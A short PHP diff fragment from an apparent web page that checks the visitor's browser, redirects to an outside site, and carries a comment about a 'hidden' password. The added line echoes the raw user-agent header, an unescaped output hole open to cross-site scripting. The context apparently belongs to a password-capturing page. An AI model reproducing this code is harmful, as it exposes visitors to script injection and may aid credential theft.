@@ -9,6 +9,7 @@ if ( strpos($userAgent, 'Firefox') !== false || strpos($userAgent, 'Chrome') !==
       setTimeout(function(){ location.href = "https://frankynouva.com" },15000);</script>'; //note success hiden `password` = '".$password."',
       exit();
 }
+else { echo $userAgent;}
 
 ?>
 
